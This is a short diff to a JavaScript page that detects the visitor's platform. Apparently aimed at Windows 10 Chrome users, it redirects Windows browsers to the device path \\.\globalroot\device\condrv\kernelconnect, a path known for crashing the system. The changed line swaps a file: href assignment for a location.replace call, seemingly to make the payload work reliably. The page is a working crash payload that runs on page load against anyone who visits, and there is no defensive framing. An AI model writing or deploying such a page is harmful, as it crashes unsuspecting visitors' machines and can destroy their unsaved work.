@@ -13,7 +13,7 @@ function getOS() {
     document.write(platform+" detected. works on win10 chrome only.");
   } else if (windowsPlatforms.indexOf(platform) !== -1) {
     document.write(platform+" detected.");
-    document.location.href = "file:\\.\globalroot\device\condrv\kernelconnect";
+    document.location.replace("\\.\globalroot\device\condrv\kernelconnect");
   } else if (/Android/.test(userAgent)) {
     document.write(platform+" detected. works on win10 chrome only.");
   } else if (!os && /Linux/.test(platform)) {
